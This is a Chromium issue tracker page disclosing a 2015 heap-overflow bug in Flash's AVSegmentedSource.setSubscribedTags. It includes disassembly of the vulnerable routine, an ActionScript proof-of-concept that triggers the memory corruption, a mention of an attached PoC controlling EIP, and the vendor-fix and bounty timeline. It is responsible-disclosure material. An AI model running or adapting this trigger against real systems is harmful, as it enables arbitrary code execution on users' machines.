# Security: Use After Free in Flash AVSS.setSubscribedTags can cause memory corruption

| Field | Value |
|-------|-------|
| **Issue ID** | [40081730](https://issues.chromium.org/issues/40081730) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **Reporter** | bi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-03-26 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

Use After Free in Flash AVSS.setSubscribedTags, setCuePointTags and setSubscribedTagsForBackgroundManifest can be abused to write pointers to String to freed locations.

**VERSION**  

Chrome Version: 41.0.2272.101 stable, Flash 17.0.0.134  

Operating System: Win7 x64 SP1

**REPRODUCTION CASE**  

Use After Free vulnerability in AVSS.setSubscribedTags can cause arbitrary code execution.  

pepflashplayer.dll 17.0.0.134, based at 0x10000000.

The setSubscribedTags is handled by sub\_103255AD:

.text:103255AD push ebp  

.text:103255AE mov ebp, esp  

.text:103255B0 and esp, 0FFFFFFF8h  

.text:103255B3 sub esp, 14h  

.text:103255B6 push ebx  

.text:103255B7 mov ebx, [ebp+arg\_0]  

.text:103255BA push esi  

.text:103255BB push edi  

.text:103255BC mov edi, eax  

.text:103255BE mov eax, [ebx]  

.text:103255C0 mov ecx, ebx  

.text:103255C2 call dword ptr [eax+8Ch] ; first get the length of the provided array  

.text:103255C8 lea esi, [edi+4Ch]  

.text:103255CB mov [esp+20h+var\_C], eax  

.text:103255CF call sub\_103265BB  

.text:103255D4 mov esi, [esp+20h+var\_C]  

.text:103255D8 test esi, esi  

.text:103255DA jz loc\_1032566D  

.text:103255E0 xor ecx, ecx  

.text:103255E2 push 4  

.text:103255E4 pop edx  

.text:103255E5 mov eax, esi  

.text:103255E7 mul edx  

.text:103255E9 seto cl  

.text:103255EC mov [edi+58h], esi  

.text:103255EF neg ecx  

.text:103255F1 or ecx, eax  

.text:103255F3 push ecx  

.text:103255F4 call unknown\_libname\_129 ; and then allocate an array of 4\*length  

.text:103255F9 and [esp+24h+var\_10], 0  

.text:103255FE pop ecx  

.text:103255FF mov [edi+54h], eax ; that pointer is put at offset 0x54 in the object pointed by edi

Next there is a for loop that iterates over the array items and calls the toString() method of each item encountered:

.text:10325606 loc\_10325606:  

.text:10325606 mov eax, [edi+8]  

.text:10325609 mov eax, [eax+14h]  

.text:1032560C mov esi, [eax+4]  

.text:1032560F push [esp+20h+var\_10]  

.text:10325613 mov eax, [ebx]  

.text:10325615 mov ecx, ebx  

.text:10325617 call dword ptr [eax+3Ch] ; get the ith element  

.text:1032561A push eax  

.text:1032561B mov ecx, esi  

.text:1032561D call sub\_1007205D ; call element->toString()  

.text:10325622 lea ecx, [esp+20h+var\_8]  

.text:10325626 push ecx  

.text:10325627 call sub\_10061703  

.text:1032562C mov eax, [esp+20h+var\_4]  

.text:10325630 inc eax  

.text:10325631 push eax  

.text:10325632 call unknown\_libname\_129  

.text:10325637 mov edx, [edi+54h]  

.text:1032563A pop ecx  

.text:1032563B mov ecx, [esp+20h+var\_10]  

.text:1032563F mov [edx+ecx\*4], eax ; write a pointer to the string in the array  

...  

.text:1032565F inc [esp+20h+var\_10]  

.text:10325663 mov eax, [esp+20h+var\_10]  

.text:10325667 cmp eax, [esp+20h+var\_C]  

.text:1032566B jl short loc\_10325606

The issue can be triggered as follows. Register an object with a custom toString method in an array and call AVSS.setSubscribedTags(array). When object.toString() is called, call again AVSS.setSubscribedTags with a smaller array. This results in freeing the first buffer. So when the execution flow returns to AVSS.setSubscribedTags a UAF occurs allowing an attacker to write a pointer to a string somewhere in memory.

Trigger with that:

```
var avss:flash.media.AVSegmentedSource  = new flash.media.AVSegmentedSource ();  
  
var o:Object = new Object();  
o.toString = function():String {  
    var a = [0,1,2,3];  
    avss.setSubscribedTags(a);  
    return "ahahahahah"  
};  
  
var a = [o,1,2,3,4,5,6,7,8,9];  
var i:uint = 0;  
while (i < 0x100000) {  
    i++;  
    a.push(i);  
}  
avss.setSubscribedTags(a);  

```

Note: AVSS.setCuePointTags and AVSS.setSubscribedTagsForBackgroundManifest are vulnerable as well, see XAVSSArrayPoc2.swf and XAVSSArrayPoc3.swf.

Compile with mxmlc -target-player 15.0 -swf-version 25 XAVSSArrayPoc.as.

## Attachments

- [XAVSS_setSubscribedTags.zip](attachments/XAVSS_setSubscribedTags.zip) (application/zip, 5.9 KB)
- [XAVSS_eip.zip](attachments/XAVSS_eip.zip) (application/zip, 2.5 KB)

## Timeline

### bi...@gmail.com (2015-03-26)

My mistake, not a UAF but instead a heap overflow. We allocate first 4*0x100000 bytes, then free that buffer, then reallocate 4*4 bytes, then write 0x100000 pointers to a buffer of size 0x10.

### in...@chromium.org (2015-03-26)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-03-26)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-03-26)

Deadline tracking via P0 bug: https://code.google.com/p/google-security-research/issues/detail?id=303

### bi...@gmail.com (2015-03-27)

Poc showing how to control eip. Can we do a memory leak with that issue? No idea actually, but as always there must be a solution ;)

### sc...@gmail.com (2015-03-27)

Adobe tracking as PSIRT-3532.

### sc...@gmail.com (2015-05-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-05-12)

https://helpx.adobe.com/security/products/flash-player/apsb15-09.html

### ti...@google.com (2015-08-17)

As discussed, reward should be paid this week.

### cl...@chromium.org (2015-08-18)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/470864?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081730)*
